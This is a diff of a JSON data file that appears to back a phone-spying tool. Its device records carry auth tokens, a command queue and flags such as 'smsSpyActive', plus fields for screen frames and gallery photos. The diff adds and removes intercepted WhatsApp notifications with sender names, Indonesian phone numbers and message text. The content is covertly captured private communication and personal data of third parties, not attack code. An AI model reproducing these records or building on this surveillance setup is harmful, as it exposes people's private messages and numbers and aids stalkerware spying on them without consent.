@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777355311857,
+    "lastSeen": 1777355317838,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -474,7 +474,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777355309008,
+    "lastSeen": 1777355318009,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -490,6 +490,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Ibu Syantik",
+        "content": "Iya",
+        "time": "28/04 12:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777355318778
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2 pesan dari 2 chat",
+        "time": "28/04 12:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777355313898
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 838-7699-8241",
+        "content": "Apa",
+        "time": "28/04 12:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777355313806
+      },
       {
         "appName": "WhatsApp",
         "sender": "Ibu Syantik",
@@ -4465,30 +4489,6 @@
         "time": "27/04 20:11",
         "pkg": "com.whatsapp",
         "receivedAt": 1777295514216
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 856-5985-6951",
-        "content": "Lu nambah mau kagak? Ama uang ini",
-        "time": "27/04 20:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777295500520
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 856-5985-6951",
-        "content": "Lu nambah mau kagak? Ama uang ini",
-        "time": "27/04 20:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777295499712
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 856-5985-6951",
-        "content": "Lu nambah mau kagak? Ama uang ini",
-        "time": "27/04 20:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777295499704
       }
     ],
     "galleryPhotos": [],
